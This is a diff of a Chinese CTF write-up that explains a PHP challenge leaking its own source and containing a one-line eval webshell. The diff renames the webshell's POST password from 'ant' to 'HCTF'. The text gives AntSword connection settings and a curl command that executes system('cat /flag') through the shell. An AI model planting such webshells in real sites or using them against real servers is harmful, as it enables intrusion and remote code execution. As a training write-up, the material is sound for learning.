@@ -9,18 +9,17 @@ GET 访问直接回显它自己的源码：
 
 ```php
 <?php
-// 离职的运维小哥留下的维护接口
 highlight_file(__FILE__);
-@eval($_POST['ant']);
+@eval($_POST['HCTF']);
 ```
 
 ## 1. 读源码
 
-三行代码两件事：
+两件事：
 
 - `highlight_file(__FILE__)`：把自身源码高亮回显——这就是"源码暴露"本身；
-- `@eval($_POST['ant'])`：把 POST 参数 `ant` 的值当 PHP 代码执行——
-  经典一句话木马，连接密码（参数名）就是 `ant`。
+- `@eval($_POST['HCTF'])`：把 POST 参数 `HCTF` 的值当 PHP 代码执行——
+  经典一句话木马，连接密码（参数名）就是 `HCTF`。
 
 ## 2. 蚁剑连接
 
@@ -29,7 +28,7 @@ highlight_file(__FILE__);
 | 配置项 | 值 |
 |---|---|
 | URL 地址 | `http://<题目地址>/`（即 index.php，填 `/index.php` 亦可） |
-| 连接密码 | `ant` |
+| 连接密码 | `HCTF` |
 | 连接类型 | PHP |
 
 测试连接，基础信息（路径 / 系统 / 用户）正常返回，连接成功。
@@ -46,6 +45,6 @@ highlight_file(__FILE__);
 ## 4. 后记
 
 一句话木马本质是「把 POST 参数当代码执行」，所以不装工具手搓请求同样可行：
-`curl -d "ant=system('cat /flag');" http://<题目地址>/`。
+`curl -d "HCTF=system('cat /flag');" http://<题目地址>/`。
 writeup 目录里的 exp.py 复现的是蚁剑默认配置下的真实流量结构（明文 PHP 代码包在
 固定头部与回显函数之间），不开蚁剑也能完整走一遍利用链。
